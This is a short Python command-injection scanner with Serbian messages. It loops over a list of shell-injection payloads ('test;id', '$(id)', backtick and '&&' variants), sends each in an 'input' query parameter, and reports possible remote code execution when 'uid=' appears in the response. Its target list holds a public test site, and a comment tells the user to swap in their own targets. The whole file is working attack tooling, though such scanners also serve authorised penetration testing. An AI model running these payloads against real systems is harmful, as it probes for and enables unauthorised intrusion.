import requests
from utils.log_utils import log_to_sheet

RCE_PAYLOADS = [
    "test;id", "test|id", "$(id)", "`id`", "%24(id)", "test&&id"
]

def test_rce(url):
    try:
        for payload in RCE_PAYLOADS:
            full_url = f"{url}?input={payload}"
            print(f"[+] Testiram RCE na: {full_url}")
            response = requests.get(full_url, timeout=5)
            if "uid=" in response.text or "gid=" in response.text:
                print(f"[!] Mogući RCE: {full_url}")
                log_to_sheet(__file__, f"RCE: {full_url}")
    except Exception as e:
        print(f"[-] Greška: {e}")

def run_rce():
    print("[~] Pokrećem RCE test...")
    targets = [
        "http://testphp.vulnweb.com",  # zameni sa svojim metama
    ]
    for t in targets:
        test_rce(t)

if __name__ == "__main__":
    run_rce()
